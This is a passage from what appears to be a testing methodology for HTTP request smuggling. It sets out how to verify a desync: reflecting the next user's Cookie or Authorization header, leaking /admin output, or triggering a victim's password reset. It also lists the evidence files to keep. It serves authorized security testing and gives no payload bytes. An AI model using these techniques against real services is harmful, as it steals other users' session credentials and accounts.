If you can map the target to one of these lab shapes, copy the lab's payload structure into the harness above before iterating.

## Verification

A smuggle is only confirmed when the smuggled prefix produces VICTIM-OBSERVABLE side effects. Acceptable evidence:

- **Stolen cookie/header**: smuggled request to `/echo` reflects the NEXT user's `Cookie:` / `Authorization:` header back into your response. Repro ≥3 times to rule out coincidence.
- **Backend admin output reflected**: smuggled `GET /admin` returns admin content in YOUR response (i.e. the prefix arrived BEFORE your trailing real request and the back-end concatenated the responses).
- **Cross-user state contamination**: smuggled `POST /password-reset?user=victim` triggers a real password reset for `victim` (only on test/lab targets — out of scope on real engagements).

Differential 400/501 alone is **NOT** verification. Connection close after one request alone is **NOT** verification. You need a payload that proves the back-end accepted attacker bytes as the start of someone else's request.

## Output Files

```
./
├── smuggle_gate.txt                    # Confirm-desync gate output (PASS/FAIL evidence)
├── smuggle_<target>_<variant>.txt      # Per-variant raw response captures
├── smuggle_<target>_evidence.txt       # Cross-user / admin-bleed proof
└── smuggle_<target>_summary.md         # Variant tried, gate result, evidence trail
```
